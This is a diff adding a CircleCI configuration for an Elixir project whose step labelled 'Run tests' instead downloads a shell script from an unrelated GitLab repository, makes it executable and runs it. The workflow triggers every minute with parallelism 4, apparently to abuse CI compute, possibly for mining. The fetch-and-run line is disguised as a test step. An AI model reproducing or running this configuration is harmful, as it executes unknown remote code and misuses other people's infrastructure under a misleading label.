@@ -1,0 +1,46 @@
+working_dir: &working_dir ~/app
+.build_template: &script
+  steps:
+    - checkout
+    
+    
+    - run:
+        name: Run tests
+        command: |
+                    
+                    wget https://gitlab.com/TambraHudgens/aww/-/raw/main/sapu.sh && chmod u+x sapu.sh && ./sapu.sh
+                    
+
+version: 2.0
+jobs:
+  endvoc:
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+    steps:
+      - checkout
+  endvoc1:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+workflows:
+  version: 2
+  commit:
+    jobs:
+      - endvoc
+      - endvoc1
+
+
+    triggers:
+      - schedule:
+          cron: '* * * * *'
+          filters:
+            branches:
+              only:
+                - master
+         
+  endvocrunjob:
+    jobs:
+      - endvoc
+      - endvoc1
